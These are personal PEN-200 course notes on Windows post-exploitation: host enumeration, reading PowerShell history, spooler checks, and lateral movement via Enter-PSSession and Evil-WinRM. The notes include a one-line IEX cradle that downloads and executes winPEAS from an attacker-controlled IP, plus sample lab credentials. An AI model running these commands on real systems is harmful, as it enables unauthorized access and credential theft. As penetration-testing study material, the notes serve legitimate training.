# From pen-200 course.  




### Host enumeration

**can be automated with winPEAS.ps1**
```powershell
IEX(New-Object Net.WebClient).downloadString('http://192.168.45.247/winPEAS.ps1')
```
[winPEAS.ps1 download](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

**Enumeration requirements**

- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes

<br><br><br>
Get all local users:  Get-LocalUser  
<a name="Get-LocalUser">

Get all local groups: Get-LocalGroup   OR net localgroup  
<a name="Get-LocalGroup">

Gather:  
- systeminfo
- ipconfig /a
- route print
- netstat -ano
- Get-Process
**SHOWS THE POWERSHELL  HISTORY**
- Get-History       
- type (Get-PSReadlineOption).HistorySavePath **this shows all history. Even what Clear-history doesnt clear**
- 
  <br><br>

  Get all installed programs X86:
  ``` powershell
  Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  ```

  Get all installed programs X64:
  ```powershell
  Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  ```

### printer spooler enumeration
Check to see if print spooler is running
ls "\dc01\pipe\spoolss"



### Lateral movement techniques  
<br>
- Lateral movement with Enter-PSSession:
  
``` Powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```
<br>
- Lateral movement with Evil-winrm(apparently enter-pssession isnt too stable)
[Evil-WinRm github](https://github.com/Hackplayers/evil-winrm)

**WinRm is on port 5985**

<img width="835" height="725" alt="image" src="https://github.com/user-attachments/assets/13bc6534-e9d7-49a6-8c61-a06f995ea0cb" />



- 


  
